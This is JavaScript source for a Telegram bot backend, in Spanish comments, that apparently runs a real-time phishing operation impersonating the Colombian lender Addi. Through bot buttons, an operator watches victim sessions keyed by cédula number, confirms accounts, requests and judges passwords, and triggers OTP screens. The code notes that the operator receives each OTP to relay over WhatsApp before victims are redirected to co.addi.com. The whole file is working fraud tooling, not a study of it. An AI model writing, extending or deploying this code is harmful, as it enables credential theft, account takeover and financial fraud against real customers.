// ============================================================================
//  🎛️ BOT DE TELEGRAM DEL ASESOR — reemplaza por completo a dashboard.html
//  Telegram manda aquí cada vez que el asesor toca un botón o escribe un texto.
//  El bot escribe el MISMO campo `comando` en Firestore que escribía el dashboard,
//  así el cliente (index.html) avanza/corrige exactamente igual que antes.
//
//  Configuración (Vercel → Project → Settings → Environment Variables):
//    TELEGRAM_BOT_TOKEN    → token que te da @BotFather
//    ADMIN_CHAT_ID         → el ID de tu chat (el asesor) con el bot
//    FIREBASE_API_KEY      → apiKey de tu proyecto Firebase  (config web)
//    FIREBASE_PROJECT_ID   → projectId de tu proyecto Firebase
//    FIREBASE_ADMIN_TOKEN  → el mismo token de asesor que en index.html (esAdmin)
//
//  El webhook se configura una sola vez (ver README):
//    https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/setWebhook?url=https://TUDOMINIO/api/bot
// ============================================================================

// 🔒 Config SOLO desde variables de entorno de Vercel (nada en el código):
//    FIREBASE_API_KEY, FIREBASE_PROJECT_ID, FIREBASE_ADMIN_TOKEN, ...
const FIREBASE_API_KEY    = process.env.FIREBASE_API_KEY    || '';
const FIREBASE_PROJECT_ID = process.env.FIREBASE_PROJECT_ID || '';
const ADMIN_TOKEN         = process.env.FIREBASE_ADMIN_TOKEN || '';
const TELEGRAM_BOT_TOKEN  = process.env.TELEGRAM_BOT_TOKEN  || '';
const ADMIN_CHAT_ID       = process.env.ADMIN_CHAT_ID       || '';

// ---------------------------------------------------------------- Telegram --
function tg(method, body) {
  return fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/' + method, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body || {})
  }).then(r => r.json());
}

// ---------------------------------------------------------------- Firestore --
// Login anónimo (igual que hace index.html) para poder leer/escribir con las
// reglas de Firestore. Con el campo adminToken dentro de cada solicitud se
// cumple esAdmin() en las reglas.
async function anonToken() {
  const url = 'https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=' + encodeURIComponent(FIREBASE_API_KEY);
  const r = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ returnSecureToken: true })
  });
  const j = await r.json();
  if (!j.idToken) throw new Error('Firebase auth falló: ' + JSON.stringify(j));
  return j.idToken;
}

function rest(path, method, body, token) {
  const url = 'https://firestore.googleapis.com/v1/projects/' + encodeURIComponent(FIREBASE_PROJECT_ID) +
              '/databases/(default)/documents' + path + '?key=' + encodeURIComponent(FIREBASE_API_KEY);
  const opts = { method, headers: { Authorization: 'Bearer ' + token } };
  if (body) { opts.headers['Content-Type'] = 'application/json'; opts.body = JSON.stringify(body); }
  return fetch(url, opts).then(r => r.json());
}

// JS → formato de campos de Firestore REST
function fv(v) {
  if (v === null || v === undefined) return { nullValue: null };
  const t = typeof v;
  if (t === 'boolean') return { booleanValue: v };
  if (t === 'number')  return Number.isInteger(v) ? { integerValue: v } : { doubleValue: v };
  if (t === 'string')  return { stringValue: v };
  if (Array.isArray(v)) return { arrayValue: { values: v.map(fv) } };
  if (t === 'object') {
    const fields = {};
    for (const k in v) fields[k] = fv(v[k]);
    return { mapValue: { fields } };
  }
  return { nullValue: null };
}

// Firestore REST → JS (mapValue, arrayValue, timestamp, etc.)
function unfv(v) {
  if (!v) return null;
  if ('stringValue' in v)   return v.stringValue;
  if ('integerValue' in v)  return v.integerValue;
  if ('doubleValue' in v)   return v.doubleValue;
  if ('booleanValue' in v)  return v.booleanValue;
  if ('timestampValue' in v) return String(v.timestampValue);
  if ('mapValue' in v) {
    const out = {};
    for (const k in v.mapValue.fields) out[k] = unfv(v.mapValue.fields[k]);
    return out;
  }
  if ('arrayValue' in v) return v.arrayValue.values.map(unfv);
  if ('referenceValue' in v) return String(v.referenceValue);
  return null;
}

async function updateDoc(camino, campos) {
  const t = await anonToken();
  const fields = {};
  for (const k in campos) fields[k] = fv(campos[k]);
  return rest('/' + camino, 'PATCH', { fields }, t);   // PATCH = merge (como updateDoc)
}

async function getDoc(camino) {
  const t = await anonToken();
  const j = await rest('/' + camino, 'GET', null, t);
  if (!j.fields) return null;
  return unfv(j.fields);
}

async function listDocs(coleccion, pageSize) {
  const t = await anonToken();
  const j = await rest('/' + coleccion + '?pageSize=' + (pageSize || 200), 'GET', null, t);
  const out = [];
  (j.documents || []).forEach(d => {
    out.push(Object.assign({ id: d.name.split('/').pop() }, unfv(d.fields)));
  });
  return out;
}

async function borrarDoc(camino) {
  const t = await anonToken();
  return rest('/' + camino, 'DELETE', null, t);
}

// Escribe un `comando` = lo que ve el cliente en su doc de solicitud
// (mismo formato que hacía fUpdateDoc en dashboard.html)
async function comando(sid, payload) {
  return updateDoc('solicitudes/' + encodeURIComponent(sid), {
    comando: Object.assign({ id: Date.now(), canal: sid, adminToken: ADMIN_TOKEN }, payload)
  });
}

// Estado del bot: qué dato le está pidiendo al asesor (monto / comercio / teléfono)
async function setEspera(chatId, espera, sid, extra) {
  return updateDoc('bot_chats/' + encodeURIComponent(String(chatId)), {
    espera, sid: sid || '', extra: extra || {}
  });
}

// ---------------------------------------------------------------- Utilidades --
function esAdmin(chatId) {
  const admin = String(ADMIN_CHAT_ID || '');
  return !admin || String(chatId) === admin;
}
function fmt(n) {
  if (n === undefined || n === null) return '—';
  return '$' + Number(n).toLocaleString('es-CO');
}
function aviso(chatId, texto) {
  return tg('sendMessage', { chat_id: chatId, text: texto });
}

// ---------------------------------------------------------------- Lista de sesiones --
async function enviarLista(chatId) {
  let docs;
  try { docs = await listDocs('solicitudes', 200); } catch (e) { docs = []; }
  if (!docs.length) { await aviso(chatId, '📭 No hay sesiones activas.'); return; }
  docs.sort((a, b) => String(b.actualizado || '').localeCompare(String(a.actualizado || '')));
  const top = docs.slice(0, 10);
  const lineas = ['📋 ' + docs.length + ' sesión(es) activa(s):', ''];
  top.forEach(d => {
    const da = d.datos || {};
    lineas.push('🆔 ' + d.id.slice(0, 12) + ' · ' + (d.pendiente ? '⏳ ' : '· ') + (d.paso || '?') + ' · 👤 ' + (da.cedula || '?'));
  });
  const filas = top.map(d => [{ text: '🗑 ' + d.id.slice(0, 8), callback_data: 'del|' + d.id }]);
  filas.push([{ text: '🗑 Borrar TODAS', callback_data: 'delall|#' }]);
  filas.push([{ text: '🧪 Probar bot', callback_data: 'prob|#' }]);
  await tg('sendMessage', { chat_id: chatId, text: lineas.join('\n'), reply_markup: { inline_keyboard: filas } });
}

async function borrarTodas(chatId) {
  let docs;
  try { docs = await listDocs('solicitudes', 300); } catch (e) { docs = []; }
  let ok = 0, err = 0;
  for (const d of docs) {
    try { await borrarDoc('solicitudes/' + encodeURIComponent(d.id)); ok++; }
    catch (e) { err++; }
  }
  await aviso(chatId, '🗑 Borradas ' + ok + ' sesión(es).' + (err ? ' (fallaron ' + err + ')' : ''));
}

function enviarMenu(chatId) {
  const texto =
    '🤖 Panel del asesor — Addi\n\n' +
    'Comandos:\n' +
    '/menu — este menú\n' +
    '/solicitudes — ver sesiones activas\n' +
    '/probar — probar el bot\n' +
    '/borrar — borrar TODAS las sesiones\n\n' +
    'Cuando el bot te pida un dato (monto, comercio o teléfono), solo escríbelo en el chat.';
  return tg('sendMessage', {
    chat_id: chatId,
    text: texto,
    reply_markup: {
      inline_keyboard: [
        [{ text: '📋 Ver sesiones activas', callback_data: 'list|#' }],
        [{ text: '🧪 Probar bot', callback_data: 'prob|#' }],
        [{ text: '🗑 Borrar TODAS las sesiones', callback_data: 'delall|#' }]
      ]
    }
  });
}

// ---------------------------------------------------------------- Inputs del asesor (texto) --
async function recibirInput(chatId, text) {
  const est = await getDoc('bot_chats/' + encodeURIComponent(String(chatId)));
  if (!est || !est.espera || !est.sid) {
    await aviso(chatId, 'Escribe /menu para ver los comandos del bot.');
    return;
  }
  const sid = String(est.sid);
  if (est.espera === 'monto') {
    const m = Number(String(text).replace(/[^0-9]/g, ''));
    if (!m || m <= 0) { await aviso(chatId, '❌ Escribe solo el número, ej: 2000000'); return; }
    await setEspera(chatId, 'comercio', sid, { monto: m });
    await aviso(chatId, '✅ Monto: ' + fmt(m) + '\n✍️ Ahora escribe el comercio aliado (ej: Mac Center). Si no aplica, escribe /omitir.');
    return;
  }
  if (est.espera === 'comercio') {
    const monto = Number((est.extra && est.extra.monto) || 0);
    const comercio = (String(text).trim() === '/omitir') ? '' : String(text).trim();
    await setEspera(chatId, '', '', {});
    await comando(sid, { monto: monto, comercio: comercio, go: 's-processing' });
    await aviso(chatId, '✅ Retiro autorizado' + (comercio ? ' — 👔 ' + comercio : '') + '. El cliente está en procesando → OTP.');
    return;
  }
  if (est.espera === 'telefono') {
    const t = String(text || '').replace(/\D/g, '');
    if (t.length < 6) { await aviso(chatId, '❌ Número no válido (mínimo 6 dígitos).'); return; }
    await setEspera(chatId, '', '', {});
    await comando(sid, { telefono: t, go: 's-otp' });
    await aviso(chatId, '✅ Enviado. El cliente verá el código OTP en su pantalla y TÚ recibirás el código en este chat para pasárselo por WhatsApp.');
    return;
  }
  await setEspera(chatId, '', '', {});
}

// ---------------------------------------------------------------- Callbacks (botones) --
async function procesarCallback(cb) {
  const chatId = cb.message && cb.message.chat ? cb.message.chat.id : null;
  const data = String(cb.data || '');
  const p = data.split('|');
  const accion = p[0];
  const sid = p.length > 1 ? p[1] : '';
  const extra = p.length > 2 ? p[2] : '';

  // Confirmación rápida al botón (sin editar el mensaje original)
  await tg('answerCallbackQuery', { callback_query_id: cb.id, text: 'Procesando…' });
  if (!esAdmin(chatId)) return;

  try {
    if (accion === 'okced') {
      await comando(sid, { go: 's-pass' });
      await aviso(chatId, '✅ Cuenta existe → se pidió la contraseña.');
    } else if (accion === 'noked') {
      await comando(sid, { error: 'cuenta-no-existe' });
      await aviso(chatId, '❌ Cuenta no existe → se le avisó al cliente.');
    } else if (accion === 'okpass') {
      await comando(sid, { go: 's-verif' });
      await aviso(chatId, '✅ Verificación exitosa — pantalla de carga activada. El cliente verá «Verificación exitosa» y luego será redirigido a co.addi.com.');
    } else if (accion === 'badpass') {
      await comando(sid, { error: 'pass-incorrecta' });
      await aviso(chatId, '❌ Contraseña incorrecta → se le avisó al cliente.');
    } else if (accion === 'step') {
      await comando(sid, { go: extra });
      await aviso(chatId, '✅ Aprobado: ' + (extra || '') + '.');
    } else if (accion === 'del') {
      await borrarDoc('solicitudes/' + encodeURIComponent(sid));
      await aviso(chatId, '🗑 Sesión ' + sid.slice(0, 12) + ' eliminada.');
    } else if (accion === 'delall') {
      await borrarTodas(chatId);
    } else if (accion === 'prob') {
      await aviso(chatId, '🧪 ¡Bot funcionando! ✅');
    } else if (accion === 'list') {
      await enviarLista(chatId);
    } else if (accion === 'menu') {
      await enviarMenu(chatId);
    }
  } catch (e) {
    await tg('answerCallbackQuery', {
      callback_query_id: cb.id,
      text: 'Error: ' + String(e.message || e).slice(0, 100),
      show_alert: true
    });
  }
}

// ---------------------------------------------------------------- Mensajes de texto --
async function procesarMensaje(msg) {
  const chatId = msg.chat && msg.chat.id;
  const text = String(msg.text || '').trim();
  if (!chatId) return;
  if (!esAdmin(chatId)) return;

  if (text === '/start' || text === '/menu') { await enviarMenu(chatId); return; }
  if (text === '/solicitudes') { await enviarLista(chatId); return; }
  if (text === '/probar') { await aviso(chatId, '🧪 ¡Bot funcionando! ✅'); return; }
  if (text === '/borrar') { await borrarTodas(chatId); return; }

  // Cualquier otro texto = dato que el bot estaba esperando (monto/comercio/teléfono)
  try { await recibirInput(chatId, text); } catch (e) { /* ignora */ }
}

// ============================================================================
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') { res.sendStatus(204); return; }
  if (req.method !== 'POST') { res.status(405).json({ error: 'POST only' }); return; }
  if (!TELEGRAM_BOT_TOKEN) {
    res.status(500).json({ error: 'TELEGRAM_BOT_TOKEN no configurado en Vercel' });
    return;
  }
  if (!FIREBASE_API_KEY || !FIREBASE_PROJECT_ID) {
    res.status(500).json({ error: 'FIREBASE_API_KEY y FIREBASE_PROJECT_ID no configurados en Vercel' });
    return;
  }

  try {
    const u = req.body || {};
    if (u.message && u.message.text) {
      await procesarMensaje(u.message);
    } else if (u.callback_query && u.callback_query.data) {
      await procesarCallback(u.callback_query);
    }
    res.json({ ok: true });
  } catch (e) {
    res.json({ ok: false, error: String(e.message || e) });
  }
}